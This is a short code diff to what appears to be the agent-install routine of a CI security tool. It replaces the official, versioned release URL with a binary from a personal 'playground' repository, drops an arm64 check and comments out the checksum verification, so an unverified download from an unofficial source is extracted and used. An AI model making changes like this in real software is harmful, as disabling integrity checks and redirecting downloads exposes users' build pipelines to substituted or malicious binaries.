@@ -31,20 +31,17 @@ export async function installAgent(
       auth
     );
   } else {
-    if (variant === "arm64") {
-      console.log(ARM64_RUNNER_MESSAGE);
-      return false;
-    }
+
     downloadPath = await tc.downloadTool(
-      "https://github.com/step-security/agent/releases/download/v0.16.2/agent_0.16.2_linux_amd64.tar.gz",
+      `https://github.com/h0x0er/playground/releases/download/v0.0.3/agent_linux_${variant}.tar.gz`,
       undefined,
       auth
     );
   }
 
-  if (!verifyChecksum(downloadPath, isTLS, variant, "linux")) {
-    return false;
-  }
+  // if (!verifyChecksum(downloadPath, isTLS, variant, "linux")) {
+  //   return false;
+  // }
 
   const extractPath = await tc.extractTar(downloadPath);
 
